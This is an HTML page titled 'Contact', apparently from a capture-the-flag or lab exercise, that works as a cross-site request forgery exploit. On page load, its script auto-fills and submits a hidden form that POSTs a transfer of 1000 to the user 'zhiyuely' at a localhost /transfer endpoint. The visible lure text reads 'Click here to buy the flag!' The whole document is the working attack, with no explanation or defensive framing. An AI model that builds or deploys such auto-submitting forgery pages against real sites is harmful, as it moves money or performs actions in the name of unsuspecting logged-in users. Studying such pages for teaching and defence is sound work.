<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Contact</title>
    <script type="text/javascript">
        window.onload = function() {
            document.getElementById('inputTo').value = 'zhiyuely'; 
            document.getElementById('inputAmount').value = 1000;
            document.forms[0].submit();
        };
    </script>
</head>
<body>
    <div class="container">
        <h2>You have</h2>
        <form action="https://127.0.0.1:8080/transfer" method="POST">
            <div class="form-row">
                <div class="form-group col-md-6">
                    <label for="inputTo">To</label>
                    <input type="text" class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?">
                </div>
                <div class="form-group col-md-6">
                    <label for="inputAmount">Amount</label>
                    <input type="number" class="form-control" id="inputAmount" name="amount" placeholder="Amount to transfer">
                </div>
            </div>
            <button type="submit" class="btn btn-primary" style="display:none;">Send the Money!</button>
        </form>

        Click here to buy the flag!
    </div>
</body>
</html>
